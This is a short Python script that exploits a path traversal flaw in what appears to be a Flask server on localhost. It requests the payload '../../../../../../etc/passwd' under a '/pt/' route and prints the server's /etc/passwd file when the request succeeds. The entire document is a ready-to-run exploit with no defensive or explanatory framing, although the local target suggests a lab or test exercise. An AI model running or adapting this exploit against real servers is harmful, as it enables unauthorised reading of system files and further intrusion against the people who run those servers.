import requests


def exploit_path_traversal(base_url):
    # Construct the URL to exploit the path traversal vulnerability
    payload = "../../../../../../etc/passwd"
    exploit_url = f"{base_url}/pt/{payload}"

    try:
        # Send the request to the server
        response = requests.get(exploit_url)

        # Check if the request was successful
        if response.status_code == 200:
            print("Successfully retrieved /etc/passwd file:")
            print(response.text)
        else:
            print(f"Failed to retrieve /etc/passwd file. Status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    # Replace with the actual base URL of the Flask server
    base_url = "http://localhost:5000"
    exploit_path_traversal(base_url)
